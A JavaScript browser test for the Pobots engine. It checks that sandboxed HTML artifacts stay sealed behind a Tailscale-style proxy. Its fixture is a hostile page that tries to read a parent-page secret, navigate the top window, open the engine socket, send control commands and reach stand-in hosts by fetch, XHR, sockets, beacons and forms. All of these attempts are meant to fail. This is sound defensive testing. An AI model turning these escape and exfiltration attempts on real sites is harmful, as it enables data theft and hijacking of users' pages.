// The seal of /page/, proven in a real browser (docs/build/step-2f.md, A3 and A5). No model.
//
// Runs the engine's own HTTP server in this process on temporary folders, with a stand-in harness
// that only calls show_artifact. In front of it runs a small proxy that does what `tailscale serve`
// does (keeps the Host, drops identity headers the caller sent, adds Tailscale-User-Login and
// X-Forwarded-For). A "canary" server stands for every other host on the network and counts each
// request it gets. Headless Chromium then opens:
//
//   1. A stand-in for the Pobots page (served by the engine as its app window) with a hostile
//      artifact in a frame, sandboxed exactly as the app will do it. The artifact tries to read the
//      page around it, navigate it away, open the engine's socket, call the engine, and reach other
//      hosts with fetch, XHR, sockets, event streams, beacons, forms, images, scripts, frames,
//      workers and prefetch. Each must fail; the canary must get nothing, and the engine nothing but
//      the artifact's own files.
//   2. A frame without the engine's policy (sandbox attribute only) opening the socket: the socket
//      refuses its Origin of "null" even with the person's Tailscale identity. Both frames that try
//      the socket also send the browser calls (step 2g: state, watch, input, own) at once if it
//      opens; none may reach the engine's browser.
//   3. A plain artifact: an inline script and style, Chart.js from cdnjs, a Google font, a
//      supporting script, stylesheet and image from its own folder, and a link that opens a new tab.
//   4. The same plain artifact framed by a file page (the desktop window) and by another site
//      (refused), and the hostile one opened in a tab of its own (still sealed).
//
// Needs internet for cdnjs and Google Fonts (step 3). Nothing is published anywhere.
//
//   node engine/tests/seal-check.mjs [--keep]
import { registerHooks } from "node:module";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer, request as httpRequest } from "node:http";
import { connect } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

process.env.POBOTS_LOG ??= "warn";
registerHooks({
  resolve(specifier, context, nextResolve) {
    try {
      return nextResolve(specifier, context);
    } catch (err) {
      if ((specifier.startsWith(".") || specifier.startsWith("/")) && specifier.endsWith(".js")) return nextResolve(specifier.slice(0, -3) + ".ts", context);
      throw err;
    }
  },
});

const here = dirname(fileURLToPath(import.meta.url));
const root = dirname(dirname(here));
const { Engine } = await import("../engine.js");
const { Store } = await import("../store.js");
const { EngineServer } = await import("../server.js");
const { launch } = await import(pathToFileURL(join(root, "scripts", "browser.mjs")).href);

const keep = process.argv.includes("--keep");
const PROTOCOL_VERSION = Number(/export const PROTOCOL_VERSION = (\d+)/.exec(readFileSync(join(root, "shared", "protocol.ts"), "utf8"))[1]);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const LOGIN = "seal-check@example.com";
const HOST = "pobots-seal.test";
const CANARY = "canary.test";
const EVIL = "evil.test";
const SANDBOX = "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-downloads allow-forms allow-modals";

let failed = 0;
const lines = [];
const observed = [];
const check = (name, ok, extra = "") => {
  if (!ok) failed++;
  const line = `${ok ? "ok  " : "FAIL"}  seal: ${name}${extra ? `  (${extra})` : ""}`;
  lines.push(line);
  console.log(line);
};

const work = mkdtempSync(join(tmpdir(), "pobots-seal-check-"));
const dataDir = join(work, "data");
const botsDir = join(work, "bots");
const uiDir = join(work, "ui");
for (const d of [dataDir, botsDir, uiDir]) mkdirSync(d, { recursive: true });

const listen = (server) => new Promise((r) => server.listen(0, "127.0.0.1", () => r(server.address().port)));

// ------------------------------------------------------------ the canary: every other host
const canaryHits = [];
const canary = createServer((req, res) => {
  canaryHits.push(`${req.method} ${req.headers.host} ${req.url}`);
  if (req.url?.startsWith("/evil-frame")) {
    const src = new URL(req.url, "http://x").searchParams.get("src");
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(`<!doctype html><script>window.got=[];addEventListener('message',e=>got.push(e.data));</script><iframe sandbox="${SANDBOX}" src="${src}"></iframe>`);
    return;
  }
  res.writeHead(200, { "Content-Type": "text/plain", "Access-Control-Allow-Origin": "*" });
  res.end("canary");
});
canary.on("upgrade", (req, socket) => {
  canaryHits.push(`UPGRADE ${req.headers.host} ${req.url}`);
  socket.destroy();
});
const canaryPort = await listen(canary);
const C = `http://${CANARY}:${canaryPort}`;

// ------------------------------------------------------------ the engine, with a stand-in harness
class StandIn {
  constructor(settings) {
    this.settings = settings;
    this.closed = false;
  }
  start() {}
  send() {}
  async interrupt() {}
  async stopTask() {}
  async setModel() {}
  async setEffort() {}
  async setAccess() {}
  async supportedModels() {
    return [];
  }
  close() {
    this.closed = true;
  }
}
const sessions = [];
const store = new Store(join(dataDir, "pobots.db"));
const server = new EngineServer("seal-check-token-0123456789", { uiDir, allowedLogins: [LOGIN] });
const engine = new Engine({
  config: { port: 0, dataDir, botsDir, machineName: "Seal Check", claude: {}, serve: true, remote: { allowedLogins: [LOGIN] } },
  store,
  claude: { ready: true, executable: "/stand-in/claude", version: "0", env: {} },
  emit: (event, data) => server.broadcast(event, data),
  createSession: (s) => {
    const f = new StandIn(s);
    sessions.push(f);
    return f;
  },
  sessionExists: async () => true,
});
engine.init();
// Every call that reaches the bots' browser (step 2g). The sealed frames must reach none.
const browserCalls = [];
for (const m of ["stateFor", "watch", "unwatch", "control", "input", "go", "selection", "own", "close"]) {
  const original = engine.browser[m].bind(engine.browser);
  engine.browser[m] = (...args) => {
    browserCalls.push(m);
    return original(...args);
  };
}
server.attach(engine);
const enginePort = await server.listen(0);
// Every request that reaches the engine, and whether it came through the proxy.
const engineHits = [];
server["http"].on("request", (req) => engineHits.push(`${req.method} ${req.headers["x-forwarded-for"] ? "proxy" : "direct"} ${req.url}`));
server["http"].on("upgrade", (req) => engineHits.push(`UPGRADE ${req.headers["x-forwarded-for"] ? "proxy" : "direct"} ${req.url} origin=${req.headers.origin ?? "-"}`));

// ------------------------------------------------------------ the proxy: what tailscale serve does
const IDENTITY = ["tailscale-user-login", "tailscale-user-name", "tailscale-user-profile-pic", "tailscale-funnel-request"];
const proxyHeaders = (h) => {
  const out = { ...h };
  for (const k of IDENTITY) delete out[k];
  out["tailscale-user-login"] = LOGIN;
  out["x-forwarded-for"] = "100.64.0.9";
  out["x-forwarded-proto"] = "http";
  return out;
};
const proxy = createServer((req, res) => {
  const up = httpRequest({ host: "127.0.0.1", port: enginePort, method: req.method, path: req.url, headers: proxyHeaders(req.headers) }, (r) => {
    res.writeHead(r.statusCode ?? 502, r.headers);
    r.pipe(res);
  });
  up.on("error", () => res.destroy());
  req.pipe(up);
});
proxy.on("upgrade", (req, socket, head) => {
  const up = connect(enginePort, "127.0.0.1", () => {
    const h = proxyHeaders(req.headers);
    up.write(`${req.method} ${req.url} HTTP/1.1\r\n${Object.entries(h).map(([k, v]) => `${k}: ${v}`).join("\r\n")}\r\n\r\n`);
    up.write(head);
    up.pipe(socket);
    socket.pipe(up);
  });
  up.on("error", () => socket.destroy());
  socket.on("error", () => up.destroy());
});
const proxyPort = await listen(proxy);
const P = `http://${HOST}:${proxyPort}`;

// ------------------------------------------------------------ the pages
// The stand-in for the Pobots page: something secret to read, its own socket (allowed), and the frame.
writeFileSync(
  join(uiDir, "host.html"),
  `<!doctype html><html><head><title>Pobots</title></head><body>
<div id="secret">pobots-secret-7781</div>
<script>
window.got = []; window.alive = 'yes'; window.parentSocket = 'pending';
addEventListener('message', (e) => got.push(e.data));
const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws');
ws.onopen = () => { window.parentSocket = 'open'; ws.close(); };
ws.onerror = () => { window.parentSocket = 'refused'; };
const q = new URLSearchParams(location.search);
const f = document.createElement('iframe');
if (q.get('sandbox') !== 'none') f.setAttribute('sandbox', q.get('sandbox') || ${JSON.stringify(SANDBOX)});
f.setAttribute('referrerpolicy', 'no-referrer');
f.title = 'Artifact';
f.style.cssText = 'position:fixed;left:0;top:0;width:800px;height:600px;border:0';
f.src = q.get('src');
document.body.appendChild(f);
</script></body></html>`,
);
// A frame without the engine's policy: only the sandbox attribute stands between it and the socket.
writeFileSync(
  join(uiDir, "bare.html"),
  `<!doctype html><script>
const ws = new WebSocket('ws://' + location.host + '/ws');
let done = false;
const say = (v) => { if (!done) { done = true; parent.postMessage({ bare: v, origin: self.origin }, '*'); } };
const BROWSER = [['hello', { protocol: ${PROTOCOL_VERSION}, client: 'bare' }], ['browser.state', {}], ['browser.own', { url: 'https://example.com' }], ['browser.watch', { spaceId: '1' }], ['browser.input', { watchId: 'x', events: [{ type: 'text', text: 'x' }] }], ['browser.answer', { watchId: 'x', answer: { kind: 'dialog', accept: true } }], ['browser.view', { watchId: 'x', ratio: 2 }], ['browser.page.show', { watchId: 'x' }], ['browser.page.open', { watchId: 'x', url: 'https://example.com' }], ['browser.page.close', { watchId: 'x', pageId: 'x' }]];
ws.onopen = () => { BROWSER.forEach((c, i) => ws.send(JSON.stringify({ t: 'req', id: String(i + 1), method: c[0], params: c[1] }))); say('open'); };
ws.onerror = () => say('refused');
ws.onclose = () => say('refused');
setTimeout(() => say('timeout'), 5000);
</script>`,
);
writeFileSync(join(uiDir, "index.html"), "<!doctype html><title>Pobots</title>");

const bot = engine.createBot("Seal Test");
const dir = join(botsDir, bot.id);
const put = (rel, content) => {
  const full = join(dir, ...rel.split("/"));
  mkdirSync(dirname(full), { recursive: true });
  writeFileSync(full, content);
};

// The hostile artifact. Each try reports { name, blocked, detail }; "done" ends the list.
const hostile = `<!doctype html><html><head><title>Hostile</title>
<link rel="prefetch" href="${C}/prefetch">
<link rel="stylesheet" href="${C}/style.css">
<script src="${C}/script.js"></script>
</head><body><p>Nothing to see</p>
<img src="${C}/img.png">
<div style="background:url(${C}/bg.png);width:10px;height:10px"></div>
<script>
const report = (name, blocked, detail) => { const m = { name, blocked, detail: String(detail ?? '').slice(0, 160) }; window.__seal = (window.__seal || []).concat(m); try { parent.postMessage(m, '*'); } catch {} };
const violations = [];
document.addEventListener('securitypolicyviolation', (e) => violations.push(e.violatedDirective + ' ' + e.blockedURI));
const settle = (p, ms = 3000) => Promise.race([p.then(() => 'reached', (e) => 'blocked: ' + e), new Promise((r) => setTimeout(() => r('timeout'), ms))]);
const sync = (name, fn) => { try { const v = fn(); report(name, false, v); } catch (e) { report(name, true, e && e.name); } };
async function tryAll() {
  report('origin is opaque', self.origin === 'null', self.origin);
  sync('read the Pobots page', () => parent.document.getElementById('secret').textContent);
  sync('read the Pobots address', () => parent.location.href);
  sync('read the top page', () => top.document.body.innerHTML);
  sync('use storage of the Pobots origin', () => localStorage.getItem('x') ?? 'readable');
  sync('read cookies', () => document.cookie || 'readable');
  // In a tab of its own the page is the top: moving itself is not moving Pobots, so these only run in a frame.
  if (top !== self) {
    sync('navigate the Pobots page (top.location)', () => { top.location = '${C}/top'; return 'set'; });
    sync('navigate the Pobots page (top.location.href)', () => { top.location.href = '${C}/top2'; return 'set'; });
    sync('navigate the Pobots page (window.open _top)', () => { const w = window.open('${C}/top3', '_top'); if (w) throw 0; throw new Error('null'); });
  }
  const f = async (name, url, init) => { const r = await settle(fetch(url, init)); report(name, r !== 'reached', r); };
  await f('fetch an engine address (relative)', '/api/whoami');
  await f('fetch the engine directly', 'http://127.0.0.1:${enginePort}/api/whoami');
  await f('POST to a hook address', '/hook/abc/def', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
  await f('fetch another host', '${C}/fetch');
  await f('fetch another host (no-cors)', '${C}/fetch-nocors', { mode: 'no-cors' });
  const x = (name, url, method = 'GET') => new Promise((res) => {
    try { const r = new XMLHttpRequest(); r.open(method, url); r.onload = () => res(report(name, false, 'loaded')); r.onerror = () => res(report(name, true, 'error')); r.send(method === 'POST' ? '{}' : null); setTimeout(() => res(report(name, true, 'timeout')), 3000); }
    catch (e) { res(report(name, true, e.name)); }
  });
  await x('XHR to the engine', '/api/whoami');
  await x('XHR POST to a hook address', '/hook/abc/def', 'POST');
  await x('XHR to another host', '${C}/xhr');
  const s = (name, url) => new Promise((res) => {
    let said = false; const once = (b, d) => { if (!said) { said = true; res(report(name, b, d)); } };
    try { const w = new WebSocket(url); w.onopen = () => { try { [['hello', { protocol: ${PROTOCOL_VERSION}, client: 'hostile' }], ['browser.state', {}], ['browser.own', { url: 'https://example.com' }], ['browser.watch', { spaceId: '1' }]].forEach((c, i) => w.send(JSON.stringify({ t: 'req', id: String(i + 1), method: c[0], params: c[1] }))); } catch (e) {} once(false, 'open'); }; w.onerror = () => once(true, 'error'); w.onclose = () => once(true, 'closed'); setTimeout(() => once(true, 'timeout'), 3000); }
    catch (e) { once(true, e.name); }
  });
  await s('open the engine socket (page address)', 'ws://' + location.host + '/ws');
  await s('open the engine socket (direct)', 'ws://127.0.0.1:${enginePort}/ws');
  await s('open a socket to another host', 'ws://${CANARY}:${canaryPort}/ws');
  await new Promise((res) => {
    try { const es = new EventSource('${C}/events'); es.onopen = () => res(report('event stream to another host', false, 'open')); es.onerror = () => { es.close(); res(report('event stream to another host', true, 'error')); }; setTimeout(() => res(report('event stream to another host', true, 'timeout')), 3000); }
    catch (e) { res(report('event stream to another host', true, e.name)); }
  });
  // sendBeacon says true when it queues; the policy refuses the send afterwards. Whether anything
  // arrived is told by the request counts of the canary and the engine ("count").
  try { navigator.sendBeacon('${C}/beacon', 'x'); } catch {}
  try { navigator.sendBeacon('/hook/abc/def', '{}'); } catch {}
  report('beacon to another host', 'count', 'judged by what arrived');
  report('beacon to a hook address', 'count', 'judged by what arrived');
  await new Promise((res) => {
    try {
      const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)'], { type: 'text/javascript' })));
      w.onmessage = () => res(report('worker', false, 'ran'));
      w.onerror = () => res(report('worker', true, 'error'));
      setTimeout(() => res(report('worker', true, 'timeout')), 3000);
    } catch (e) { res(report('worker', true, e.name)); }
  });
  const fr = document.createElement('iframe'); fr.src = '${C}/frame'; document.body.appendChild(fr);
  const im = new Image(); im.src = '${C}/img2.png';
  // Forms: to a hook address, and to another host in a new tab.
  const form = (action, target) => { const fm = document.createElement('form'); fm.method = 'POST'; fm.action = action; fm.target = target; const i = document.createElement('input'); i.name = 'x'; i.value = '1'; fm.appendChild(i); document.body.appendChild(fm); try { fm.submit(); } catch (e) {} };
  form('/hook/abc/def', '_blank');
  form('${C}/form-blank', '_blank');
  await new Promise((r) => setTimeout(r, 1500));
  report('violations seen', true, violations.length + ': ' + [...new Set(violations.map((v) => v.split(' ')[0]))].join(', '));
  report('done', true, '');
  // Last, a form that would take this frame itself to another host.
  form('${C}/form-self', '_self');
}
tryAll();
</script></body></html>`;
put("artifacts/hostile/index.html", hostile);

// The plain artifact.
put(
  "artifacts/plain/index.html",
  `<!doctype html><html><head><title>Plain page</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Lobster&display=block" rel="stylesheet">
<link rel="stylesheet" href="style.css">
<style>#inline { color: rgb(10, 20, 30); } #font { font-family: 'Lobster', monospace; font-size: 30px; }
#out { position: fixed; left: 10px; top: 10px; width: 200px; height: 40px; display: block; background: #eee; }</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
<script src="app.js"></script>
</head><body>
<a id="out" href="${C}/link" target="_blank" rel="noopener">Open the link</a>
<p id="inline" style="margin-top:60px">Inline style</p><p id="css">Style from its folder</p><p id="font">Lobster font</p>
<img id="logo" src="img/logo.svg" width="20" height="20">
<canvas id="chart" width="200" height="100"></canvas>
<script>
window.inlineRan = true;
const say = (m) => { window.__plain = m; parent.postMessage({ plain: m }, '*'); };
addEventListener('load', async () => {
  let chart = false;
  try { new Chart(document.getElementById('chart'), { type: 'bar', data: { labels: ['a', 'b'], datasets: [{ data: [1, 2] }] }, options: { animation: false } }); chart = true; } catch (e) { chart = String(e); }
  try { await document.fonts.load("30px 'Lobster'"); } catch {}
  say({
    inlineScript: window.inlineRan === true,
    inlineStyle: getComputedStyle(document.getElementById('inline')).color,
    chartLib: typeof Chart === 'function',
    chart,
    font: document.fonts.check("30px 'Lobster'"),
    supportScript: window.supportLoaded === true,
    supportStyle: getComputedStyle(document.getElementById('css')).color,
    supportImage: document.getElementById('logo').naturalWidth,
    origin: self.origin,
  });
});
</script></body></html>`,
);
put("artifacts/plain/app.js", "window.supportLoaded = true;");
put("artifacts/plain/style.css", "#css { color: rgb(40, 50, 60); }");
put("artifacts/plain/img/logo.svg", `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="#3a6"/></svg>`);

// The bot shows both, through its tool, as in a real turn.
engine.sendMessage({ botId: bot.id, text: "Show the pages" });
for (let i = 0; i < 50 && !sessions.length; i++) await sleep(20);
const tool = sessions[0].settings.tools.find((t) => t.name === "show_artifact");
put("artifacts/wander/index.html", `<!doctype html><title>Wanderer</title><script>try { window.open('${C}/popup', '_blank'); } catch {} setTimeout(() => { location.href = '${C}/wander'; }, 300);</script>`);
for (const p of ["artifacts/hostile/index.html", "artifacts/plain/index.html", "artifacts/wander/index.html"]) {
  const r = await tool.handler({ path: p });
  check(`show_artifact ${p}`, !r.isError, r.content[0].text);
}
sessions[0].settings.onEvent({ type: "turn-end", ok: true, subtype: "success", errors: [] });
const list = engine.listArtifacts(bot.id);
const srcOf = (title) => engine.openArtifact({ botId: bot.id, artifactId: list.find((a) => a.title === title).id }).path;
const hostileSrc = srcOf("Hostile");
const plainSrc = srcOf("Plain page");
const wanderSrc = srcOf("Wanderer");
const hostileKey = hostileSrc.split("/")[2];
const plainKey = plainSrc.split("/")[2];

// ------------------------------------------------------------ the browser
const b = await launch({
  profile: join(work, "profile"),
  args: [`--host-resolver-rules=MAP ${HOST} 127.0.0.1, MAP ${CANARY} 127.0.0.1, MAP ${EVIL} 127.0.0.1`],
});
await b.cmd("Page.enable");
await b.cmd("Runtime.enable");
await b.cmd("Target.setDiscoverTargets", { discover: true });
const targets = [];
b.on((m) => {
  if (m.method === "Target.targetCreated" || m.method === "Target.targetInfoChanged") targets.push(m.params.targetInfo.url);
});
const go = async (url) => {
  await b.cmd("Page.navigate", { url });
  await sleep(300);
};

try {
  // 1. The hostile artifact in the Pobots page.
  const canaryBefore = canaryHits.length;
  const engineBefore = engineHits.length;
  await go(`${P}/host.html?src=${encodeURIComponent(hostileSrc)}`);
  const finished = await b.until("window.got && window.got.some((m) => m && m.name === 'done')", 60_000);
  check("the hostile artifact ran in its frame and reported", !!finished);
  const got = (await b.js("JSON.stringify(window.got)")) ?? "[]";
  const tries = JSON.parse(got).filter((m) => m && m.name && m.name !== "done" && m.name !== "violations seen");
  // Tries judged by the request counts pass only when nothing arrived anywhere (checked below too).
  const quiet = () => canaryHits.slice(canaryBefore).length === 0 && engineHits.slice(engineBefore).every((h) => !h.includes("/hook/") && !h.includes("/api/"));
  for (const t of tries) check(`hostile: ${t.name}: fails`, t.blocked === true || (t.blocked === "count" && quiet()), t.blocked === "count" ? (quiet() ? "nothing arrived" : "something arrived") : t.detail);
  const viol = JSON.parse(got).find((m) => m && m.name === "violations seen");
  if (viol) console.log(`      (${viol.detail})`);
  await sleep(2500);
  check("the Pobots page is still there, unchanged", (await b.js("location.pathname + '|' + window.alive + '|' + document.getElementById('secret').textContent")) === "/host.html|yes|pobots-secret-7781");
  check("the Pobots page itself may open the socket (so the refusals above mean something)", (await b.until("window.parentSocket !== 'pending' && window.parentSocket", 10_000)) === "open");
  const canaryHostile = canaryHits.slice(canaryBefore);
  check("no other host got a single request from the hostile artifact", canaryHostile.length === 0, canaryHostile.join(", ") || "none");
  const engineHostile = engineHits.slice(engineBefore);
  const own = (h) => h === "GET proxy /host.html?src=" + encodeURIComponent(hostileSrc) || h.startsWith("UPGRADE proxy /ws origin=" + P) || h.startsWith(`GET proxy /page/${hostileKey}/`);
  const strangers = engineHostile.filter((h) => !own(h));
  check("the engine got nothing from it but the page, the artifact's own files and the page's own socket", strangers.length === 0, strangers.join(", ") || `${engineHostile.length} requests, all expected`);
  const opened = targets.filter((u) => u.includes(CANARY));
  check("no tab or window was opened by the hostile artifact", opened.length === 0, opened.join(", ") || "none");

  // 2. A sandboxed frame without the engine's policy opens the socket: refused for its Origin of "null".
  const upBefore = engineHits.length;
  await go(`${P}/host.html?src=${encodeURIComponent("/bare.html")}&sandbox=allow-scripts`);
  const bare = await b.until("window.got.find((m) => m && m.bare) && JSON.stringify(window.got.find((m) => m && m.bare))", 15_000);
  const bareRes = bare ? JSON.parse(bare) : {};
  check("a sandboxed frame cannot open the socket, even with the person's Tailscale identity", bareRes.bare === "refused", JSON.stringify(bareRes));
  const ups = engineHits.slice(upBefore).filter((h) => h.startsWith("UPGRADE"));
  check("its request reached the engine with Origin null and was refused there", ups.some((h) => h.endsWith("origin=null")), ups.join(" | "));
  check("no browser call (state, watch, input, own) reached the engine from either frame", browserCalls.length === 0, browserCalls.join(", ") || "none");

  // 3. The plain artifact.
  const canaryPlain = canaryHits.length;
  await go(`${P}/host.html?src=${encodeURIComponent(plainSrc)}`);
  const plain = await b.until("window.got.find((m) => m && m.plain) && JSON.stringify(window.got.find((m) => m && m.plain).plain)", 30_000);
  const pr = plain ? JSON.parse(plain) : {};
  check("plain: it loads and runs in the frame", !!plain, plain ? "" : "no report");
  check("plain: an inline script runs", pr.inlineScript === true);
  check("plain: an inline style applies", pr.inlineStyle === "rgb(10, 20, 30)", pr.inlineStyle);
  check("plain: Chart.js from cdnjs loads and draws", pr.chartLib === true && pr.chart === true, `${pr.chartLib} ${pr.chart}`);
  check("plain: a Google font loads", pr.font === true, String(pr.font));
  check("plain: a script from its own folder loads", pr.supportScript === true);
  check("plain: a stylesheet from its own folder loads", pr.supportStyle === "rgb(40, 50, 60)", pr.supportStyle);
  check("plain: an image from its own folder loads", pr.supportImage === 20, String(pr.supportImage));
  check("plain: it runs with an opaque origin", pr.origin === "null", pr.origin);
  // A real click on its link opens a new tab.
  const before = targets.length;
  await b.cmd("Input.dispatchMouseEvent", { type: "mousePressed", x: 60, y: 30, button: "left", clickCount: 1 });
  await b.cmd("Input.dispatchMouseEvent", { type: "mouseReleased", x: 60, y: 30, button: "left", clickCount: 1 });
  let tab = false;
  for (let i = 0; i < 40 && !tab; i++) {
    tab = targets.slice(before).some((u) => u === `${C}/link`) || canaryHits.slice(canaryPlain).some((h) => h.endsWith(" /link"));
    if (!tab) await sleep(100);
  }
  check("plain: a link opens in a new tab", tab, targets.slice(before).join(", "));
  check("plain: the Pobots page stays where it is after the click", (await b.js("location.pathname")) === "/host.html");

  // 4a. Framed by the desktop window's file page, straight from 127.0.0.1.
  const desktop = join(work, "desktop.html");
  writeFileSync(desktop, `<!doctype html><script>window.got=[];addEventListener('message',e=>got.push(e.data));</script><iframe sandbox="${SANDBOX}" src="http://127.0.0.1:${enginePort}${plainSrc}"></iframe>`);
  await go(pathToFileURL(desktop).href);
  const fromFile = await b.until("window.got.find((m) => m && m.plain) && JSON.stringify(window.got.find((m) => m && m.plain).plain)", 30_000);
  const fr = fromFile ? JSON.parse(fromFile) : {};
  check("the desktop window's file page may frame it, and it works there", fr.inlineScript === true && fr.supportScript === true && fr.chart === true, fromFile ?? "no report");

  // 4b. Framed by another site: refused.
  await go(`http://${EVIL}:${canaryPort}/evil-frame?src=${encodeURIComponent(P + plainSrc)}`);
  await sleep(3000);
  const evil = await b.js("JSON.stringify(window.got)");
  check("another site cannot frame it", evil === "[]", evil);

  // 4c. The hostile artifact opened in a tab of its own: still sealed.
  const canaryTab = canaryHits.length;
  await go(`${P}${hostileSrc}`);
  const tabDone = await b.until("Array.isArray(window.__seal) && window.__seal.some((m) => m.name === 'done')", 60_000);
  check("opened in a tab of its own, it still runs", !!tabDone);
  const inTab = JSON.parse((await b.js("JSON.stringify(window.__seal || [])")) ?? "[]");
  const want = ["origin is opaque", "use storage of the Pobots origin", "fetch an engine address (relative)", "POST to a hook address", "fetch another host", "XHR to another host", "open the engine socket (page address)", "beacon to another host"];
  await sleep(1500);
  const tabHits = canaryHits.slice(canaryTab).filter((h) => !h.endsWith("/form-self"));
  for (const name of want) {
    const t = inTab.find((m) => m.name === name);
    check(`in a tab of its own: ${name}: fails`, t?.blocked === true || (t?.blocked === "count" && tabHits.length === 0), t?.detail ?? "not reported");
  }
  check("in a tab of its own: no other host got a request", tabHits.length === 0, tabHits.join(", ") || "none");
  const selfForm = canaryHits.slice(canaryBefore).filter((h) => h.endsWith("/form-self"));
  check("a form never took the frame or the tab to another host", selfForm.length === 0, selfForm.join(", ") || "none");

  // 5. What the sandbox cannot forbid, recorded for the notes (not a failure): the frame moving
  //    itself to another address, and a popup (allowed on purpose, so that links open in a new tab).
  const seen = canaryHits.length;
  await go(`${P}/host.html?src=${encodeURIComponent(wanderSrc)}`);
  await sleep(3000);
  const wandered = canaryHits.slice(seen);
  observed.push(`a frame can move itself to another address: ${wandered.some((h) => h.endsWith(" /wander")) ? "yes" : "no"}`);
  observed.push(`a script can open a popup to another address without a click: ${wandered.some((h) => h.endsWith(" /popup")) ? "yes" : "no (the browser's popup blocker)"}`);
  check("the Pobots page stays where it is when the frame moves itself", (await b.js("location.pathname + '|' + document.getElementById('secret').textContent")) === "/host.html|pobots-secret-7781");
} catch (err) {
  check("the browser check ran to the end", false, err instanceof Error ? err.stack : String(err));
} finally {
  await b.close();
  engine.shutdown();
  await server.close();
  store.close();
  proxy.close();
  canary.close();
  proxy.closeAllConnections?.();
  canary.closeAllConnections?.();
}

for (const o of observed) console.log(`seen  seal: ${o}`);
console.log(failed ? `seal: ${failed} check${failed === 1 ? "" : "s"} failed` : `seal: all ${lines.length} checks passed`);
if (failed || keep) console.log(`seal: temporary folder kept: ${work}`);
else rmSync(work, { recursive: true, force: true });
process.exit(failed ? 1 : 0);
